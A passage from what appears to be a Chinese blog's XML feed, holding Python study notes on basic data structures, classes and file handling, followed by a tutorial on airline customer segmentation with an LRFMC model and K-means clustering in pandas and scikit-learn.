4.4列表解析</h3><blockquote><p>只需要一行代码就可以产生列表结构为：类似为[i for i in range(1,11)]</p></blockquote><h3 id="45切片"><a class="markdownIt-Anchor" href="#45切片"></a> 4.5切片</h3><blockquote><p>大体的索引结构为：[start🔚step]</p></blockquote><p>可以通过切片来复制列表为一个新的列表[:]</p><h3 id="46元组tuple"><a class="markdownIt-Anchor" href="#46元组tuple"></a> 4.6元组tuple</h3><blockquote><p>不可变的列表，用（）来表示，不可修改</p></blockquote><h3 id="47集合"><a class="markdownIt-Anchor" href="#47集合"></a> 4.7集合</h3><blockquote><p>集合可以用来去掉重复的列表数据</p></blockquote><p>集合的操作：交、并、差、是否为子集</p><ul><li>set.add(obj)添加操作</li><li>set.remove(obj)删除,若不存在则抛出异常</li><li>set.discard(obj)删除，相对于remove()它不会抛出异常。</li><li>set.pop()弹出，返回任意的值，所以并不能用来获取弹出的值</li><li>set.clear()清除集合</li></ul><h3 id="48pep8"><a class="markdownIt-Anchor" href="#48pep8"></a> 4.8PEP8</h3><p>编码规则：</p><ul><li>缩进：主要不要混用制表键和空格，使用编辑器应该设置好制表键与空格的关系字符</li><li>行长：不超过80个,编辑器中可以设置视觉线。</li></ul><h2 id="五-条件语句"><a class="markdownIt-Anchor" href="#五-条件语句"></a> 五、条件语句</h2><blockquote><p>根据条件来进行选择什么样的措施</p></blockquote><h3 id="51条件测试"><a class="markdownIt-Anchor" href="#51条件测试"></a> 5.1条件测试</h3><p>检查的标准是条件表达式返回的是True还是False，进而来判断是否执行相应语句</p><blockquote><p>=赋值 ==是检查是否相等  ！=不相等<br />检查多个条件用and或者or<br />检查是否在结构中用in或者not in</p></blockquote><h3 id="52if语句"><a class="markdownIt-Anchor" href="#52if语句"></a> 5.2if语句</h3><pre><code>if condition ：passelif condition：else：</code></pre><h3 id="53if语句的用处"><a class="markdownIt-Anchor" href="#53if语句的用处"></a> 5.3if语句的用处：</h3><ul><li>检测异常值，符合异常条件的数据</li><li>判断列表是不是空的</li></ul><p><strong>注意在使用比价运算符时PEP8提供建议是在运算符号两边添加空格，方便阅读</strong></p><h2 id="六-字典"><a class="markdownIt-Anchor" href="#六-字典"></a> 六、字典</h2><blockquote><p>字典是一系列键-值对  用{}表示</p></blockquote><h3 id="61使用字典"><a class="markdownIt-Anchor" href="#61使用字典"></a> 6.1使用字典</h3><ul><li>通过键来访问value</li><li>因为字典是一种动态的结构可以随时的添加键值对，是可变的对象，python不关心键值对的添加顺序，只关心相互关系</li><li>修改字典中的value是通过key来修改</li><li>删除，del, 同修改</li><li>字典的键必须是不可变类型</li><li>清空字典dict.clear()</li><li>dict.formkeys(seq,val=None)创建并初始化键值的字典。</li></ul><p><strong>在定义好字典时候最好在最后一个键值对后再添加一个逗号，为下一对键值对插入做准备</strong></p><h3 id="62遍历字典"><a class="markdownIt-Anchor" href="#62遍历字典"></a> 6.2遍历字典</h3><ul><li>遍历键值对   item()返回键、值</li><li>遍历键keys()或者值 values()</li><li>遍历时考虑顺序遍历的话可以使用sorted()函数来进行对keys排序</li><li>遍历值得时考虑重复数据可以使用set做一个转换消除重复值</li></ul><h3 id="63嵌套"><a class="markdownIt-Anchor" href="#63嵌套"></a> 6.3嵌套</h3><blockquote><p>{[]}、[{}].但是在字典中存储列表只能作为value存储</p></blockquote><h3 id="64字典类型内置方法"><a class="markdownIt-Anchor" href="#64字典类型内置方法"></a> 6.4字典类型内置方法</h3><ul><li>dict.clear()清空字典</li><li>dict.copy()浅拷贝字典</li><li>dict.fromkeys(seq，default=None)，创建一个字典，seq是key，并初始化values为默认值。</li><li>dict.has_key()判断dict中是否有key</li><li>dict.items()，返回元组列表</li><li>dict.keys()</li><li>dict.values()</li><li>dict.pop()同get，不过是返回并删除</li><li>dict.get(key，default=None)返回key对应的值，如果没有在dict中的话返回默认值</li><li>dict.setdefault(key,default=None)</li><li>dict.update(dict2)将dict中的键值加入到dict中，并且更新原字典。</li></ul><h2 id="七-检测用户输入和while循环"><a class="markdownIt-Anchor" href="#七-检测用户输入和while循环"></a> 七、检测用户输入和while循环</h2><blockquote><p>input(info):让程序暂停，等待用户输入一些文本，其中info为提示信息。同样在python2.7中使用raw_input()<br />while用来不断检测</p></blockquote><p><strong>input函数没什么可说的就是使用用户输入数据时要注意做类型的变换</strong></p><h3 id="71标志"><a class="markdownIt-Anchor" href="#71标志"></a> 7.1标志</h3><p>对于while，为了使用简单，当条件比较多的时候，可以通过设置标志来判断是否结束循环。</p><h3 id="72break"><a class="markdownIt-Anchor" href="#72break"></a> 7.2break</h3><p>break用来控制程序，退出循环程序，不在执行剩余代码。</p><h3 id="73continue"><a class="markdownIt-Anchor" href="#73continue"></a> 7.3continue</h3><p>continue用来控制程序流程，退出当次循环不在进行一下代码，直接跳到下一循环。</p><h2 id="八-函数"><a class="markdownIt-Anchor" href="#八-函数"></a> 八、函数</h2><blockquote><p>函数是带有名字的代码块。用来完成特定的功能。</p></blockquote><h3 id="81参数"><a class="markdownIt-Anchor" href="#81参数"></a> 8.1参数</h3><ul><li>实参：函数调用过程中传递进去的参数</li><li>形参：函数定义中的参数</li></ul><h3 id="82传递参数"><a class="markdownIt-Anchor" href="#82传递参数"></a> 8.2传递参数</h3><ul><li>位置实参：实参与形参位置相同</li><li>关键字实参：实参由变量和值组成</li><li>使用字典和列表：</li><li>函数定义中使用默认值时，要是不传进去实参，函数将会使用默认值</li><li>传参方式可以混合使用</li></ul><h3 id="83返回值"><a class="markdownIt-Anchor" href="#83返回值"></a> 8.3返回值</h3><blockquote><p>返回值可以简化主程序，将大量的工作放在函数中，使用return返回函数的运算结果。<br />让参数变成可选的在函数定义时设置为空，可以扩展函数的适用范围。</p></blockquote><h3 id="84传递任意数量的实参"><a class="markdownIt-Anchor" href="#84传递任意数量的实参"></a> 8.4传递任意数量的实参</h3><ul><li>*args</li></ul><h3 id="85将函数存储在模块中"><a class="markdownIt-Anchor" href="#85将函数存储在模块中"></a> 8.5将函数存储在模块中</h3><blockquote><p>使用module_name.function_name()来调用模块中的函数<br />模块</p></blockquote><h3 id="86注意事项"><a class="markdownIt-Anchor" href="#86注意事项"></a> 8.6注意事项</h3><p>编写函数时应该注意到，函数名字尽量使用小写字母和下划线，名字要容易解释功能，另外要包含阐述函数功能的注释。</p><h2 id="九-类"><a class="markdownIt-Anchor" href="#九-类"></a> 九、类</h2><blockquote><p>面对对象编程是最有效的软件编写方法之一，根据类来创建对象，类中定义的是一类对象都有的通用的行为，可以根据对象赋予不同的个性行为。类是用来描述具有同类属性实例的概括词汇，对象是类实例化的个体。Python中类即对象</p></blockquote><p>面对对象设计的三大特性：</p><ul><li>封装</li><li>继承</li><li>多态</li></ul><h3 id="91创建使用类"><a class="markdownIt-Anchor" href="#91创建使用类"></a> 9.1创建使用类：</h3><pre><code>class A(object):def __init__(self, *xxx)：passdef a(*xxx):pass...</code></pre><p><em>一般在Python中首字母大写的是类</em></p><p>类中包含<strong>方法（类中的函数）、属性</strong>，<strong>init</strong>()中形参必不可少必须位于其他参数之前在python创建实例的时候，将自动传给self，它是一个指定实例本身的引用。以self为前缀的类中的变量都可以被类中其他方法使用。</p><p>使用句点表示法使用类中属性和调用类中方法**.**</p><h3 id="92修改属性的值"><a class="markdownIt-Anchor" href="#92修改属性的值"></a> 9.2修改属性的值</h3><ul><li>直接修改，使用实例访问</li><li>通过方法修改属性的值</li><li>通过方法对属性的值进行递增</li></ul><h3 id="93继承"><a class="markdownIt-Anchor" href="#93继承"></a> 9.3继承</h3><blockquote><p>一个类继承另一个类时，将自动获得另一个类的所有属性和方法：<code>父类</code>-&gt;<code>子类</code><br />子类继承了父类的所有属性和方法，还可以定义自己的属性和方法。</p></blockquote><p>子类方法的__init__()方法：需要先设置父类的属性：</p><pre><code>class Car(object):def __init__(self, *xxx):passclass Necar(Car):def __init__(self, *xxx):super().__init__(*xxx)</code></pre><p>继承之后，可以定义子类的属性和方法，并且可以重写父类的方法，<strong>要与父类方法重名</strong><br />当了解了类的之后，在考虑问题是后就需要考虑属性的归属，要根据具体的业务分析编写代码，每种建模思想都没有错只是有效率高低之分，要从实践中总结。</p><h3 id="94导入类"><a class="markdownIt-Anchor" href="#94导入类"></a> 9.4导入类</h3><blockquote><p>类可以保存在模块中，然后在需要的时候导入到程序中</p></blockquote><pre><code>from a import A #导入一个类from a impoert A,B #导入模块中多个类import a #导入整个模块from a import b #一个模块中导入另一个模块</code></pre><p>自定义工作流程:<code>先开始让代码尽可能简单---确保功能正常后提取功能模块，进行模块独立-----进行模块和文件交互</code></p><p>类中的特殊方法：</p><ul><li>_<em>init</em>_(self,)构造函数</li><li>_<em>new</em>_(slef)通常用于创建不可变数据类型的子类</li><li>_<em>del</em>_(self)析构函数</li><li>_<em>str</em>_(self)可打印字符串表示</li><li>_<em>repr</em>_(self)</li><li>_<em>unicode</em>_(self)</li><li>_<em>call</em>_(self)可调用的实例</li><li>_<em>nonzero</em>_(self)对对象定义false值</li><li>_<em>len</em>_(self)</li><li>_<em>cmp</em>_(self)对象比较</li><li>_<em>lt</em>_(self)</li><li>_<em>le</em>_(self)</li><li>_<em>gt</em>_(self)</li><li>_<em>ge</em>_(self)</li><li>_<em>eq</em>_(self)</li><li>_<em>getattr</em>_(self)</li><li>_<em>setattr</em>_(self)</li><li>_<em>delattr</em>_(self)</li><li>_<em>get</em>_(self)</li><li>_<em>set</em>_(self)</li><li>_<em>delete</em>_(self)</li><li>_<em>iter</em>_(self)创建迭代器类</li><li>_<em>hash</em>_(self)散列函数值</li></ul><h2 id="十-文件和异常"><a class="markdownIt-Anchor" href="#十-文件和异常"></a> 十、文件和异常</h2><blockquote><p>异常：python创建的特殊对象，用于管理程序运行时出现的错误，让程序在面对错误的数据室更健壮。</p></blockquote><h3 id="101文件读写"><a class="markdownIt-Anchor" href="#101文件读写"></a> 10.1文件读写</h3><p>打开模式：</p><ul><li><p>t默认文本格式打开</p></li><li><p>x写模式新建一个文件，如果已经存在会报错。</p></li><li><p>b二进制模式</p></li><li><p>+打开一个文件可读可写</p></li><li><p>r只读，从头开始</p></li><li><p>rb</p></li><li><p>r+从开头开始可读可写</p></li><li><p>rb+</p></li><li><p>w文件不存在会创建文件，如果存在则从头开始写，原内容删除</p></li><li><p>w+</p></li><li><p>wb</p></li><li><p>wb+</p></li><li><p>a如果文件不存在则会创建文件，如果存在则会追加进行写入</p></li><li><p>ab</p></li><li><p>a+</p></li><li><p>ab+</p></li><li><p>相对路径：一般是当前文件夹内的文件</p></li><li><p>绝对路径：制定文件夹内的文件</p><pre><code>  with open(datafile) as file:    '''打开文件读取，并自动关闭'''    data = file.read()  print(data)</code></pre></li><li><p>写入write()</p></li><li><p>打开文件时可以传入第二个参数，来确定打开的文件操作形式 r：可读 r+：可读写 w+：写到文件末尾 a:附加到文件</p></li><li><p>主义写入时如果文件不存在会自动生成一个新文件，如果存在设定是w模式时，会自动清除对象文件重新写入。</p></li><li><p>读取read():返回文件内容readline()：读取一行文件内容，并记录读取位置readlines()：读取每行返回一个列表</p></li></ul><p>文件对象方法和数据属性：</p><ul><li>f.close()</li><li>f.fileno()</li><li>f.flush()</li><li>f.isatty()</li><li>f.read()</li><li>f.readline()</li><li>f.readlines()</li><li>f.seek(off,whence=0)移动到指定位置，第一个参数为偏移量。whence中的0表示从开头开始，为1时表示从当前位置开始，2表示从文件末尾开始。</li><li>f.tell()返回file内的当前值</li><li>f.truncate()截断file。默认为当前位置</li><li>f.write()</li><li>f.writelines(seq)向文件中写入序列，如果需要换行需要在序列中存在。</li><li>f.closed布尔类型</li><li>f.encoding返回编码类型</li><li>f.mode返回打开模式</li><li>f.name返回文件名称</li><li>f.newlines如果读取到行分隔符则为None</li></ul><h3 id="102异常"><a class="markdownIt-Anchor" href="#102异常"></a> 10.2异常</h3><blockquote><p>异常是使用try-except代码块来处理的,通过将可能引发错误的代码放进代码块中，可以提高抵御崩溃的能力</p></blockquote><pre><code>try:passexcept XxxError:passelse:pass</code></pre><p>上面的大致原理是，python尝试执行try中的代码，有一些try代码执行成功的信息放在else中,except告诉程序try中代码执行不成功时应该怎么做。</p><h3 id="103存储数据"><a class="markdownIt-Anchor" href="#103存储数据"></a> 10.3存储数据</h3><blockquote><p>json：是一种数据存储格式，并且会保存数据结构。</p></blockquote><ul><li>json.dump()存储</li><li>json.load()加载</li></ul><h3 id="104重构"><a class="markdownIt-Anchor" href="#104重构"></a> 10.4重构</h3><blockquote><p>重构将代码进行改进，使代码更清晰、容易扩展。<br />将功能代码分成几个小的或者函数进行实现</p></blockquote><h2 id="十一-测试"><a class="markdownIt-Anchor" href="#十一-测试"></a> 十一、测试</h2><p><strong>待续</strong></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>航空公司客户价值分析</title>
      <link href="/archives/e5d37995.html"/>
      <url>/archives/e5d37995.html</url>
      
        <content type="html"><![CDATA[<h1 id="一-挖掘目标"><a class="markdownIt-Anchor" href="#一-挖掘目标"></a> 一、挖掘目标</h1><p>通过分析航空公司用户数据，对客户进行分类，对不同类别的客户进行特征分析，比较不同客户的客户价值，针对不同客户价值的客户采取不同的营销手段，制定相应的营销手段。</p><p>数据的属性主要有：客户的基本信息、乘机信息、积分信息。下面就开始介绍一下详细数据挖掘流程。</p><h1 id="二-数据挖掘过程"><a class="markdownIt-Anchor" href="#二-数据挖掘过程"></a> 二、数据挖掘过程：</h1><p>首先考虑我们的目标是为了进行客户价值分类，通常采用的分析模型是RFM模型，也就是消费时间间隔、消费频率、消费金额的指标。但是对于航空行业来说，通过分析可以得知对于长距离低价位和短距离高价位的票价总额相等的客户来说显然M一样但是价值相差很大。这时候选择一定时间累计的飞行里程数和平均折扣系数的平均值代替票价金额作为分析指标，同时针对航空公司有会员制度因此加入客户关系长度作为指标之一，建立起<strong>LRFMC</strong>模型。</p><table><thead><tr><th style="text-align:center">模型</th><th style="text-align:center"><center>L</th><th style="text-align:center"><center>R</th><th style="text-align:left"><center>F</th><th style="text-align:center"><center>M</th><th style="text-align:center"><center>C</th></tr></thead><tbody><tr><td style="text-align:center">航空公司LRFMC模型</td><td style="text-align:center">会员入会时间距离观测窗口结束月数</td><td style="text-align:center">客户最近一次飞机乘坐距离观测窗口结束的月数</td><td style="text-align:left">客户观测窗口内乘坐的飞机次数</td><td style="text-align:center">客户在观测窗口中的飞行里程</td><td style="text-align:center">客户在观测窗口的乘坐舱位对应的折扣系数的平均值</td></tr></tbody></table><p>按照我们以上的RFM模型来分析的话，建立分箱图，可以很直观的显示不同客户群体，但是细分类别过多，增加的营销难度和成本。因此采取聚类的方法分析客户价值：<strong>K-means</strong></p><h2 id="1数据抽取"><a class="markdownIt-Anchor" href="#1数据抽取"></a> 1.数据抽取</h2><blockquote><p>选取观测窗口，包括起始日期和时间间隔。</p></blockquote><p><strong>观测窗口内的数据为历史数据，观测结束日期到最新时间点的数据为增量数据。</strong></p><h2 id="2数据探索explore"><a class="markdownIt-Anchor" href="#2数据探索explore"></a> 2.数据探索（explore）</h2><p>数据探索是对异常值和缺失值进行分析，分析出数据的规律和异常值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#对数据进行基本的探索</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回缺失值个数以及最大最小值</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">datafile= <span class="string">'E:\Test_learning\data\chapter7\demo\data/air_data.csv'</span> <span class="comment">#航空原始数据,第一行为属性标签</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">resultfile = <span class="string">'E:\Test_learning\data\chapter7\demo\data/explore.xls'</span> <span class="comment">#数据探索结果表</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">data = pd.read_csv(datafile, encoding = <span class="string">'utf-8'</span>) <span class="comment">#读取原始数据，指定UTF-8编码（需要用文本编辑器将数据装换为UTF-8编码）</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">explore = data.describe(percentiles = [], include = <span class="string">'all'</span>).T <span class="comment">#包括对数据的基本描述，percentiles参数是指定计算多少的分位数表（如1/4分位数、中位数等）；T是转置，转置后更方便查阅</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">explore[<span class="string">'null'</span>] = len(data)-explore[<span class="string">'count'</span>] <span class="comment">#describe()函数自动计算非空值数，需要手动计算空值数</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">explore = explore[[<span class="string">'null'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>]]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">explore.columns = [<span class="string">u'空值数'</span>, <span class="string">u'最大值'</span>, <span class="string">u'最小值'</span>] <span class="comment">#表头重命名</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="string">'''这里只选取部分探索结果。describe()函数自动计算的字段有count（非空值数）、unique（唯一值数）、top（频数最高者）、freq（最高频数）、mean（平均值）、std（方差）、min（最小值）、50%（中位数）、max（最大值）'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">explore.to_excel(resultfile) <span class="comment">#导出结果</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">print(<span class="string">"over"</span>)</span></pre></td></tr></table></figure><p><strong>经过数据探索得到了数据的空值数和最大最小值，并保存结果</strong></p><h2 id="3数据预处理"><a class="markdownIt-Anchor" href="#3数据预处理"></a> 3.数据预处理</h2><blockquote><p>数据预处理包括数据清洗、属性规约、数据变换</p></blockquote><p>在pandas中数据清洗的处理方式是一次性把满足清洗条件的一行数据全部丢弃。<br />在案例中清洗的是票价为空和（票价为0，折扣不为0，总飞行里程数大于0的记录） 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#数据清洗，过滤掉不符合规则的数据</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">datafile= <span class="string">'../data/air_data.csv'</span> <span class="comment">#航空原始数据,第一行为属性标签</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">cleanedfile = <span class="string">'../tmp/data_cleaned.csv'</span> <span class="comment">#数据清洗后保存的文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">data = pd.read_csv(datafile,encoding=<span class="string">'utf-8'</span>) <span class="comment">#读取原始数据，指定UTF-8编码（需要用文本编辑器将数据装换为UTF-8编码）</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">data = data[data[<span class="string">'SUM_YR_1'</span>].notnull()*data[<span class="string">'SUM_YR_2'</span>].notnull()] <span class="comment">#票价非空值才保留</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#只保留票价非零的，或者平均折扣率与总飞行公里数同时为0的记录。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">index1 = data[<span class="string">'SUM_YR_1'</span>] != <span class="number">0</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">index2 = data[<span class="string">'SUM_YR_2'</span>] != <span class="number">0</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">index3 = (data[<span class="string">'SEG_KM_SUM'</span>] == <span class="number">0</span>) &amp; (data[<span class="string">'avg_discount'</span>] == <span class="number">0</span>) <span class="comment">#该规则是“与”</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">data = data[index1 | index2 | index3] <span class="comment">#该规则是“或”</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">data.to_excel(cleanedfile) <span class="comment">#导出结果</span></span></pre></td></tr></table></figure><p>第二步数据清洗完之后进行属性规约，选择与模型分析相关的属性，去掉一些不相关、弱相关、和冗余的属性。<br />第三步是进行数据变换。将数据进行转换，达到适合模型使用的要求。包括属性的构造和数据标准化<br />根据已有属性分别计算L、R、F、M、C，然后进行数据标准化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#标准差标准化</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">datafile = <span class="string">'../data/zscoredata.xls'</span> <span class="comment">#需要进行标准化的数据文件；</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">zscoredfile = <span class="string">'../tmp/zscoreddata.xls'</span> <span class="comment">#标准差化后的数据存储路径文件；</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#标准化处理</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">data = pd.read_excel(datafile)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">data = (data - data.mean(axis = <span class="number">0</span>))/(data.std(axis = <span class="number">0</span>)) <span class="comment">#简洁的语句实现了标准化变换，类似地可以实现任何想要的变换。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">data.columns=[<span class="string">'Z'</span>+i <span class="keyword">for</span> i <span class="keyword">in</span> data.columns] <span class="comment">#表头重命名。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">data.to_excel(zscoredfile, index = <span class="literal">False</span>) <span class="comment">#数据写入</span></span></pre></td></tr></table></figure><p>上面已经通过数据探索和数据与处理处理完数据，下面就是模型构建和训练的过程了。</p><h2 id="4模型构建"><a class="markdownIt-Anchor" href="#4模型构建"></a> 4.模型构建</h2><h3 id="41客户聚类"><a class="markdownIt-Anchor" href="#41客户聚类"></a> 4.1客户聚类</h3><p><strong>结合业务的理解和分析来确定客户的类别数</strong></p><blockquote><p>使用算法为：K-means算法<br />调用库为：Scikit-Learn下的聚类子库(sklearn.cluster)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">   <span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.cluster <span class="keyword">import</span> KMeans <span class="comment">#导入kmeans算法</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">datafile = <span class="string">''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">data = pd.read_excel(datafile)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">kmodel = KMeans(n_cluster = k, n_jobs = <span class="number">4</span>)<span class="comment">#n_jobs是并行数，一般设置为CPU的个数</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">kmodel.fit(data)<span class="comment">#训练模型</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">kmodel.cluster_center_<span class="comment">#查看聚类中心</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">kmodel.labels_  <span class="comment">#查看个样本对应的类别</span></span></pre></td></tr></table></figure><h3 id="42客户价值分析rank"><a class="markdownIt-Anchor" href="#42客户价值分析rank"></a> 4.2客户价值分析（Rank）</h3><p>上面根据模型训练可以得到聚类中心和样本类别，下面对聚类结果进行客户价值的分析。<br />L：客户关系时间长度、R：上次乘坐航班距离观测窗口至结束的时间间隔、F：观测窗口内乘坐航班次数、M：观测窗口内的总的飞行里程、C、舱位票价平均折扣系数。通过对每个客户群体进行分析着五个指标可以将客户分为：</p><ul><li>重要保持客户：属于航空公司客户生命周期的稳定期。这类人对公司的贡献最大，也是对理想的客户类型，应该针对这类客户进行差异化管理，提高这类用户的满意度和忠诚度，尽可能延长这类客户的高消费。</li><li>重要发展客户：属于航空公司客户生命周期的发展期。这类人在当前贡献值可能不是很高，但是具有发展潜力。航空公司应该努力促使这类人增加在本公司的乘机消费和合作伙伴处的消费，增加他们转向竞争对手的转移成本。</li><li>重要挽留客户：属于航空公司客户生命周期管理的衰退期，航空公司应关注这类客户的消费时间和消费次数的变化，要掌握最新的客户信息。对其重点联系，及时营销。</li><li>一般客户与低价值客户：这种类型的客户对于航空公司的贡献比较低</li></ul><p><strong>对于上面的分类进行客户群体rank，可以得到上诉5类客户群体的优先级别。对于新增的客户信息，考虑业务的实际情况，建议每个月运行模型，对新增客户进行特征分析，适时调整营销策略。最后主要要随着观测窗口的变动进行模型的更新。一般是根据经验进行模型重新训练。</strong></p><h3 id="43模型应用"><a class="markdownIt-Anchor" href="#43模型应用"></a> 4.3模型应用</h3><p>对各个客户群进行特征分析，制定的营销手段如下：</p><ul><li>会员升级与保级：会员等级制度，做的工作是在时间节点进行提醒，或者提供会员促销活动，提高人们的消费欲望和满意度。</li><li>交叉销售：跟非航空公司企业合作，会员可以在合作企业消费获得本公司积分，增强与公司的联系。</li><li>首次兑换：达到一定的里程数可以兑换免费票或者折扣票，做到deadline提醒，或者提供优惠服务。</li></ul><h1 id="三-总结"><a class="markdownIt-Anchor" href="#三-总结"></a> 三、总结</h1><p>业务上来说客户的识别期和发展期很重要，但是最重要还是在稳定期要有一批优质的稳定客户。因此在进行业务分析时，应该将优先资源投入到这批客户中，做到一对一定制服务。</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 数据分析 </tag>
            
            <tag> K_Means </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建记录</title>
      <link href="/archives/ee940876.html"/>
      <url>/archives/ee940876.html</url>
      
